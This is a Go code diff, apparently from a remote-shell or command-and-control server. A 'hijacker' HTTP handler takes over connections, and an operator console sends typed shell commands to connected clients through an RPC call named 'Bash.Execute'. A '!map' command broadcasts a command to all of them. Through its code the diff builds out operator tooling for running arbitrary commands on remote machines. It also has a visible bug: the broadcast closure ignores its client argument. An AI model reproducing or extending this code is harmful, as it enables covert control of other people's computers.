@@ -121,7 +121,8 @@ func hijacker(w http.ResponseWriter, r *http.Request) {
 	}
 	quit := make(chan struct{})
 
-	v := make(map[string]string)
+	//v := make(map[string]interface{})
+	var v interface{}
 	decoder := json.NewDecoder(io.MultiReader(hibuf, conn))
 	if err := decoder.Decode(&v); err != nil {
 		log.Println(err)
@@ -214,12 +215,25 @@ func input() {
 				fmt.Println(err)
 			}
 
+			bash := func(line string, client *Client) {
+				req := protocol.Request{
+					Command: line,
+				}
+				resp := new(protocol.Response)
+				err := ClientPool.Current.RPC.Call("Bash.Execute", req, resp)
+				if err != nil {
+					log.Println(resp.Message, err)
+					return
+				}
+				log.Println("rpc message received:\n\n", resp.Message)
+			}
 			switch {
 			case strings.HasPrefix(line, "!map "):
 				line = strings.TrimPrefix(line, "!map ")
 				for _, v := range ClientPool.Clients.Values() {
 					client := v.(*Client)
-					client.Conn.Write([]byte(line + "\n"))
+					//client.Conn.Write([]byte(line + "\n"))
+					go bash(line, client)
 				}
 				continue
 			case line == "":
@@ -240,21 +254,7 @@ func input() {
 				}
 			}
 
-			if strings.HasPrefix(line, "rpc ") {
-				line = strings.TrimPrefix(line, "rpc ")
-				req := &protocol.Request{
-					Command: line,
-				}
-				resp := new(protocol.Response)
-				err := ClientPool.Current.RPC.Call("Hello.Execute", req, resp)
-				if err != nil {
-					log.Println(err)
-					continue
-				}
-				log.Println("rpc message received:", resp.Message)
-			} else {
-				ClientPool.Current.Conn.Write([]byte(line + "\n"))
-			}
+			go bash(line, ClientPool.Current)
 
 			promptNum += 1
 		}
